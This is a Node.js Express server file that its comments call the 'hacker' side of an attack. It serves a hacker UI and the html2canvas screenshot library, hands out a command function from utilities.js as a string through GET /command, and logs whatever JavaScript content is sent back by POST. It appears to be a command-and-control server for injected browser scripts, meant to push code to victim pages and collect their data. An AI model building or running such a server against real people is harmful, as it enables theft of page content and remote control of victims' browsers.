const express = require('express')
const app = express()
const cors = require('cors')
const util = require('./utilities.js')
const path = require('path');

const port = 3000

app.use(cors())
app.use(express.json())
app.use(express.urlencoded())

// Basic HTML page on server (hacker) side.
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/index.html'));
})

// Hacker will send the javascript content to server
app.post('/', (req, res) => {
  console.log(req.body)
  res.send('Got a POST request')
})


app.get('/command', (req, res) => {
  res.send({ "function": util[1].toString() })
})

app.post('/command', (req, res) => {
  console.log(req.body)
  res.send('Got a POST request')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})




// Get UI related files - images, css, js, ttf
app.get('/hack.ttf', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/hack.ttf'));
})

app.get('/hacker.css', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/hacker.css'));
})

app.get('/dragon.png', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/dragon.png'));
})

app.get('/html2canvas.min.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'html2canvas.min.js'));
})

app.get('/hacker.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/hacker.js'));
})